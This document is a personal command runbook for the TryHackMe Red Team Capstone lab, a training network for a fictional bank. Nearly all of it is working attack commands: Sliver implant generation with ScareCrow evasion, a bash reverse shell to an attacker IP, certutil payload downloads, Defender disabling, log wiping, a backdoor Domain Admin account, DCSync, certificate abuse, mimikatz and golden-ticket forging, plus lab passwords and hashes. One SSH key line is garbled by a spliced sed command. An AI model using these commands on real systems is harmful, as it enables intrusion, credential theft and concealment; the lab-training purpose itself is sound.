# Red-Team-Capstone-Challenge CMD-by-CMDs


[[Red-Team-Capstone-Challenge-Credentials]]
Replace the third octet IPs
```bash
sudo sed -i 's/.116./.116./g' /etc/hosts
sed 's/.116./.116./g' -i internalHosts.txt
sed 's/.113.184/.113.184/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
sed 's/.116./.116./g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
```

```
The password policy for TheReserve is the following:

* At least 8 characters long
* At least 1 number
* At least 1 special character
* Special Characters: `  !@#$%^  `
```

```
ssh e-citizen@10.200.116.250
stabilitythroughcurrency

=======================================
Username: nvm
Password: PvH2VJqhnPMcbc0t
MailAddr: nvm@corp.th3reserve.loc
IP Range: 10.200.116.0/24
=======================================
```

Host management - update addDomainsToEctHosts.sh 
```bash
#!/bin/bash

echo "10.200.116.11 mail.thereserve.loc MAIL.thereserve.loc  " | sudo tee -a /etc/hosts
echo "10.200.116.12 thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.116.13 web.thereserve.loc WEB.thereserve.loc " | sudo tee -a /etc/hosts
# vpn key required
echo "10.200.116.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
echo "10.200.116.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.116.31 SERVER01.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.116.32 SERVER02.corp.thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.116.102 CORPDC.corp.thereserve.loc " | sudo tee -a /etc/hosts
```

Initial
```bash
curl http://10.200.116.13/october/themes/demo/assets/images/ -o images
cat images | cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
# Developer on the root webapge.
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
cat users.txt | awk '{print $1"@corp.thereserve.loc"}' >> emails.txt
echo "applications@corp.thereserve.loc" >> email.txt
crackmapexec <proto> 10.200.116.0/24 -u '' -p ''
```

Chisel Organisation Helpsheet to prevent continuous lookup
```go
// remove glibc version issues be remove dependencies!
export CGO_ENABLED=0
go build -ldflags="-s -w"
// Edit proxychains file
sudo vim /etc/proxychains4.conf
socks5 $ip $port 
// VPN chisel server
./chisel server -p 20000 -reverse -socks -v

// VPN chisel Client - local pivot
nohup ./chisel client 10.50.113.184:20000 20001:127.0.0.1:20000 &
// 01-09 for individual VPN client pivots, socks, fowards
nohup ./chisel client 10.50.113.184:20000 R:127.0.0.1:20002:socks &

// 11-19 for individual * client pivots 

nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.113.184:20000 R:127.0.0.1:6379:172.19.0.2:6379 &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.113.184:20000 R:127.0.0.1: &
```

New
```bash
# https://stackoverflow.com/questions/711.116.bash-history-without-line-numbers
history | cut -c 8-
```

The play-by-play copy and paste 
```bash
ssh e-citizen@10.200.116.250
stabilitythroughcurrency
# login for flags
Username: nvm
Password: PvH2VJqhnPMcbc0t
# Powershell flags for the UTF-16
set-content -path .\nvm.txt -value ''

# http://10.200.116.12/
mohammad.ahmed@corp.thereserve.loc

rm -rf /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/*
rm -rf /home/kali/RedTeamCapStoneChallenge/Tools/DC1/*
rm -rf /home/kali/RedTeamCapStoneChallenge/Tools/JMP/*
rm -rf /home/kali/RedTeamCapStoneChallenge/Tools/SRV1/*
rm -rf /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/*
rm -rf /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/*


# Linux VPN
generate beacon --mtls 10.50.113.184:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN/VPN-update
# WRK01
generate beacon -m 10.50.113.184:11012 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin
# Serv0 foothold
generate beacon -m 10.50.113.184:11013 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/SRV1/Server01.bin
# DC foothold
generate beacon -m 10.50.113.184:11014 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/DC1/DC.bin

generate beacon -m 10.50.113.184:11015 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin
generate beacon -m 10.50.113.184:11016 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/JMP/JMP.bin
generate beacon -m 10.50.113.184:11017 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin

mtls -L 10.50.113.184 -l 11011
mtls -L 10.50.113.184 -l 11012
mtls -L 10.50.113.184 -l 11013
mtls -L 10.50.113.184 -l 11014
mtls -L 10.50.113.184 -l 11015
mtls -L 10.50.113.184 -l 11016
mtls -L 10.50.113.184 -l 11017

# Before scarecrow change the permissions
sudo chown -R kali:kali * && chmod -R +rx *

# scarecrow the bin for server01 takes ages and cpu cries, with obfu
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 

/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/SRV1/Server01.bin -Loader binary -domain bing.com -obfu -Evasion KnownDLL 

/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/DC1/DC.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 


/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin -Loader binary -domain google.com -obfu -Evasion KnownDLL 
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/JMP/JMP.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 


# cd to  directory and build
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# UPX!
upx *

# Start a listener, burpsuite and cmdi the vpn serve
python -m http.server 8443
rlwrap ncat -lvnp 36969 
;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.113.184/36969+<%261'
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0Tsed 's/.118.10/.113.184/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.mdDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
curl http://10.50.113.184:8443/chisel -o chisel
sudo cp authorized_keys /root/.ssh/authorized_keys
# If required
ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "10.200.116.12"
ssh -i vpn_root.rsa root@10.200.116.12
# From AB
./chisel server -host 10.50.113.184 -p 20000 --reverse --socks5 -v
# As www-data on the VPN
# Tools
# As root
curl http://10.50.113.184:8443/VPN/VPN-update -o VPN-update
nohup ./VPN-update &
chmod +x *
echo "" > /root/.bash_history && echo "" > /var/log/auth.log && kill -9 $$
# Clear key as www-data
echo "" > authb
sudo cp authb /root/.ssh/authorized_keys
# www-data
nohup ./chisel client 10.50.113.184:20000  R:20001:socks &
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5  127.0.0.1 20001
# rdp into server -1 
proxychains4 xfreerdp /u:lisa.moore /p:Scientist2006 /v:10.200.116.21
# Helpdesk
proxychains4 xfreerdp /u:laura.wood /p:'Password1@' /v:10.200.116.21
proxychains4 xfreerdp /u:mohammad.ahmed /p:Password1! /v:10.200.116.21
# google chrome http://10.50.113.184:8443/ 
# Download Word.exe 
# open powershell 
proxychains4 crackmapexec smb 10.200.116.31 -u 'svcScanning' -p 'Password1!'
proxychains4 crackmapexec smb 10.200.116.31 -u 'svcBackups' -p 'q9nzssaFtGHdqUV3Qv6G' --pass-pol
proxychains4 crackmapexec smb 10.200.116.31 -u 'svcBackups' -p 'q9nzssaFtGHdqUV3Qv6G' --lsa

proxychains4 impacket-secretsdump -just-dc -dc-ip 10.200.116.102 corp.thereserve.loc/svcBackups@10.200.116.102 -outputfile dcsync-dump.hashes

# AD CS Abuse
proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.116.102

proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.116.102 -ns 10.200.116.102
# First time will always timeout 
openssl x509 -in administrator_corpdc.pfx -text -noout
proxychains4 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx administrator_corpdc.pfx
# Export the krbtgt
export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache
# Either
proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.116.102 Administrator@CORPDC.corp.thereserve.loc
# Or - b199b5002b300e97a0d75cb18c0a43c0

proxychains4 evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.116.102

# Firewall Alterations
netsh advfirewall firewall add rule name= "Open Port 8443" dir=in action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name= "Open Port 8443" dir=out action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\programdata\NVM\Word.exe" enable=yes
netsh advfirewall firewall add rule name="nvm-the-drop" dir=in action=allow program="C:\Windows\system32\certutil.exe" enable=yes
# Beacon Drop 
# Either
certutil.exe -urlcache -split -f http://10.50.113.184:8443/DC1/cmd.exe cmd.exe
# Share
impacket-smbserver share $(pwd) -smb2support
xcopy \\10.50.113.184\Share\Word.exe .
.\Word.exe
# Or Evil-Winrm from Tools directory
upload $BOX/$Implant

# Due to other users making either re-DCsync the DC and this is exploratory run of better Opsec and absolute full-worst-sysadmin-turned-bad-actor-DC-out-the-window-along-with-Opsec

import-module ActiveDirectory
New-ADUser -Name 'NVM'
Set-ADAccountPassword -Identity NVM -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "NVM"
Enable-ADAccount -Identity NVM
net localgroup "Administrators" NVM /add 
gpupdate /force
# ...
proxychains4 xfreerdp /u:NVM /p:'p@ssw0rd1!' /v:10.200.116.102
proxychains4 evil-winrm -u NVM -p 'p@ssw0rd1!' -i 10.200.116.102
Set-MpPreference -DisableRealTimeMonitoring $true
# Either
certutil.exe -urlcache -split -f http://10.50.113.184:8443/Tools/PowerView/PowerView.ps1
certutil.exe -urlcache -split -f http://10.50.113.184:8443/mimikatz.zip
certutil.exe -urlcache -split -f http://10.50.113.184:8443/kekeo.zip
# Either Sliver or Evil-Winrm
upload /home/kali/RedTeamCapStoneChallenge/Tools/Tools/PowerView/PowerView.ps1 C:\programdata\NVM\PowerView.ps1
upload /home/kali/RedTeamCapStoneChallenge/Tools/mimikatz.zip C:\programdata\NVM\mimikatz.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/kekeo.zip C:\programdata\NVM\kekeo.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/DC1/OneDrive.exe C:\programdata\NVM\OneDrive.exe
# Sliver version
upload /home/kali/RedTeamCapStoneChallenge/Tools/Tools/PowerView/PowerView.ps1 C:\\programdata\\NVM\\PowerView.ps1
upload /home/kali/RedTeamCapStoneChallenge/Tools/mimikatz.zip C:\\programdata\\NVM\\mimikatz.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/kekeo.zip C:\\programdata\\NVM\\kekeo.zip
# BEACONS
Start-Process C:\programdata\NVM\OneDrive.exe -WindowStyle Hidden

expand-archive .\mimikatz.zip
expand-archive .\kekeo.zip
cd C:\programdata\nvm\mimikatz\x64\
.\mimikatz.exe
# Mimkatz 
# Remember to cycle through exfil and catagorise for data handling
privilege::debug
log
token::elevate
!+
# We are DA so
lsadump::dcsync /user:corp\krbtgt
lsadump::lsa /patch
Get-ADComputer -Identity "CORPDC"
# 
Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
# 
# 
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
# Paste details into each from template above
kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt


exit 
# Exfil out with sliver
download C:\\nvm\\mimikatz\\x64\\mimikatz.log
mv 'C:\nvm\mimikatz\x64\mimikatz.log' /home/kali/RedTeamCapStoneChallenge/data/mimikatz/corpdc-mimikatz.log
rm .\mimikatz.log








# Linux beacon for later
curl http://10.50.113.184:8443/VPN-update -o VPN-update
nohup ./VPN-update &

```



## Installs

```bash
curl https://sliver.sh/install|sudo bash

sudo apt install thunderbird remmina neo4j ntpdate bloodhound certipy-ad -y
# 
# Authenicate
# ssh e-citizen@10.200.116.250 - stabilitythroughcurrency
thunderbird
# nvm : nvm@corp.th3reserve.loc $somePassword
# Change the outbound server to 587

git clone https://github.com/r3nt0n/bopscrk.git
cd bopscrk;
pip3 install -r requirements.txt
python3 bopscrk.py -i

cd ~/RedTeamCapstoneChallenge
curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  

# Chisel building
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w" 
# Build for windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

```

Crying because of password changes
```bash
nohup nmap -sC -sV -p- 10.200.116.0/24 -oN vpn-free-lunch-sc-sv --min-rate 2000 & 
```


